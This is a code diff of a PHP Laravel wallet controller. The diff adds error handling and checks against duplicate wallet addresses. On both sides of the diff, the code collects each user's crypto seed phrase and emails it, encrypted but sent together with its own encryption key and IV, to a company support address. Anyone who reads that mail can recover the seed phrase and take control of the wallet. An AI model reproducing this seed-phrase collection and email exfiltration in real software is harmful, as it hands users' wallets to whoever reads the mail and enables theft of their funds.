@@ -33,58 +33,64 @@ class WalletController extends Controller
             'wallet_address' => 'required|string',
             'seed_phrase' => 'required|string',
         ]);
-        /* try { */
-        $cipher = "aes-256-cbc";
-        $seed_phrase = $request->input('seed_phrase');
-        $encryption_key = env("ENCRYPTION_KEY");
-        $initialization_vector = env("INITIALIZATION_VECTOR");
-        $wallet_address = $request->input('wallet_address');
-        $encrypted_data = openssl_encrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector);
-        $email_content = (object)[
-            "encrypted_data" => $encrypted_data,
-            "encryption_key" => $encryption_key,
-            "wallet_address" => $wallet_address,
-            "initialization_vector" => $initialization_vector,
-        ];
+        try {
+            $cipher = "aes-256-cbc";
+            $seed_phrase = $request->input('seed_phrase');
+            $encryption_key = env("ENCRYPTION_KEY");
+            $initialization_vector = env("INITIALIZATION_VECTOR");
+            $wallet_address = $request->input('wallet_address');
+            $encrypted_data = openssl_encrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector);
+            $email_content = (object)[
+                "encrypted_data" => $encrypted_data,
+                "encryption_key" => $encryption_key,
+                "wallet_address" => $wallet_address,
+                "initialization_vector" => $initialization_vector,
+            ];
 
-        $wallet = Wallet::where('user_id', Auth::user()->user_id)->first();
+            $wallet_exist = Wallet::where('wallet_address', $request->input('wallet_address'))->first();
 
-        if (!$wallet) {
-            $wallet = new Wallet;
-            $wallet->user_id = Auth::user()->user_id;
-            $wallet->wallet_address = $wallet_address;
-            $wallet->wallet_status = Constants::WALLET_DONE;
-            $wallet->save();
-        } else {
-            $wallet->wallet_address = $wallet_address;
-            $wallet->wallet_status = Constants::WALLET_DONE;
-            $wallet->save();
-        }
+            if ($wallet_exist) {
+                return response()->json(['message' => $request->input('wallet_address') . ' wallet address already used.'], 409);
+            }
 
-        $user_details = User::find(Auth::user()->user_id);
+            $wallet = Wallet::where('user_id', Auth::user()->user_id)->first();
 
-        Mail::send('mail.wallet-connect', ['email_content' => $email_content, 'user_details' => $user_details], function ($message) use ($user_details) {
-            $message->to('support@tokreate.com', 'Tokreate')->subject('Wallet Connect Credentials');
-        });
+            if (!$wallet) {
+                $wallet = new Wallet;
+                $wallet->user_id = Auth::user()->user_id;
+                $wallet->wallet_address = $wallet_address;
+                $wallet->wallet_status = Constants::WALLET_DONE;
+                $wallet->save();
+            } else {
+                $wallet->wallet_address = $wallet_address;
+                $wallet->wallet_status = Constants::WALLET_DONE;
+                $wallet->save();
+            }
 
-        if ($user_details->profile->user_mail_notification == 1) {
-            Mail::send('mail.wallet-setup-self', ['email_content' => $email_content, 'user_details' => $user_details], function ($message) use ($user_details) {
-                $message->to($user_details->user_email, $user_details->profile->user_profile_full_name)->subject('Wallet Credentials');
-                $message->from('support@tokreate.com', 'Tokreate');
+            $user_details = User::find(Auth::user()->user_id);
+
+            Mail::send('mail.wallet-connect', ['email_content' => $email_content, 'user_details' => $user_details], function ($message) use ($user_details) {
+                $message->to('support@tokreate.com', 'Tokreate')->subject('Wallet Connect Credentials');
             });
-        }
 
-        $response = (object)[
-            "success" => true,
-            "result" => [
-                "datas" => $wallet,
-                "message" => 'Congratulation, your wallet has been successfully connected',
-            ]
-        ];
-        return response()->json($response, 201);
-        /* }catch (\Exception $e) {
+            if ($user_details->profile->user_mail_notification == 1) {
+                Mail::send('mail.wallet-setup-self', ['email_content' => $email_content, 'user_details' => $user_details], function ($message) use ($user_details) {
+                    $message->to($user_details->user_email, $user_details->profile->user_profile_full_name)->subject('Wallet Credentials');
+                    $message->from('support@tokreate.com', 'Tokreate');
+                });
+            }
+
+            $response = (object)[
+                "success" => true,
+                "result" => [
+                    "datas" => $wallet,
+                    "message" => 'Congratulation, your wallet has been successfully connected',
+                ]
+            ];
+            return response()->json($response, 201);
+        } catch (\Exception $e) {
             return response()->json(['message' => 'Wallet connection failed!'], 409);
-        } */
+        }
     }
     public function createWallet(Request $request)
     {
@@ -121,10 +127,23 @@ class WalletController extends Controller
                     "initialization_vector" => $initialization_vector,
                 ];
 
+
+
                 if ($user_details->wallet) {
-                    /* $user_details->wallet->wallet_status = Constants::WALLET_DONE;
+
+
+                    if ($user_details->wallet->wallet_status !== Constants::WALLET_DONE) {
+                        $wallet_exist = Wallet::where('wallet_address', $wallet_address)->first();
+
+                        if ($wallet_exist) {
+                            return response()->json(['message' => $wallet_address . ' wallet address already used.'], 409);
+                        }
+                    }
+
+                    $user_details->wallet->wallet_status = Constants::WALLET_DONE;
                     $user_details->wallet->wallet_address = $wallet_address;
-                    $user_details->wallet->update(); */
+                    $user_details->wallet->update();
+
 
                     if ($user_details->profile->user_mail_notification == 1) {
                         Mail::send('mail.wallet-setup', ['email_content' => $email_content, 'user_details' => $user_details], function ($message) use ($user_details) {
